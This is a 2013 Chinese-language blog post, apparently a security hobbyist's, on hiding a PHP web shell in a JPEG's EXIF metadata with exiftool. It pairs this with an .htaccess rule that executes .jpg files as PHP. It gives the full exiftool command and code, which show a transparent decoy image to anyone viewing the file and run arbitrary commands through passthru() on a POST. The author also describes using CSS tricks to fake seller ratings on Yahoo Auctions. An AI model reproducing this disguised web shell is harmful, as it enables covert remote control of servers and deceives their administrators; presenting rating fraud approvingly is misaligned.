---
layout: post
title: "PHP Code Injection"
date: 2013-05-11 10:50
comments: true
categories: Security
---

先前提到的 [Exiftool][Exiftool] 可以用來修改Image Metadata Tag的資料。

但當網頁加入 .htaccess

    AddHandler  application/x-httpd-php .jpg

會導致讀取 http://target/image.jpg 以html/txt去讀取，

雖然因此能正確執行php，不過要是有其他使用者/管理者來檢查，

發現讀取 http://target/image.jpg 都是亂碼，不就漏餡了嘛？

如圖

![image upload][imageup1]

所以就想了個trick來掩蓋這個問題，

透過html css，將亂碼字設成透明，並加入&lt;img&gt;tag來讓圖片「看起來」是正常的

    exiftool -DocumentName='<?php if(!isset($_POST[cmd])) {echo "<body style=\"color:rgba(0,0,0,0)\"><img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/></body>";}else{passthru($_POST[cmd]);} __halt_compiler();?>' apple.jpg

當中的PHP  code是這樣子的，

    <?php 
        if(!isset($_POST[cmd])) {
            echo "<body style=\"color:rgba(0,0,0,0)\">"
            echo "<img style=\"position:absolute;top:0;left:0;\" src=\"http://image.url\"/></body>";
        }else{
            passthru($_POST[cmd]);
        } 
        __halt_compiler();
    ?>

若直接瀏覽圖片網址，如圖，會顯示出一個圖片

![phpinject1][phpinject1]

只有當 POST cmd=XX 到頁面上時，才會正確執行passthru($cmd)！

![phpinject2][phpinject2]

--- 

其實這個想法就跟淘寶前陣子很多人在用的漏洞一樣，

使用者可以自定義CSS，而導致透過CSS來假造賣家評價，來騙取使用者，

前陣子我和[dm4][dm4] 在Yahoo 拍賣也透過一樣的手法，

來做過評價的偽裝，雖然簡單但可以騙取到不少使用者的信任。

[Exiftool]: /blog/2013/02/27/image-exif-tool/
[imageup1]: /images/imageup1.png "image upload"
[phpinject1]: /images/phpinject1.png "phpinjectimage"
[phpinject2]: /images/phpinject2.png "phpinjectimage"
[dm4]: http://blog.dm4.tw 
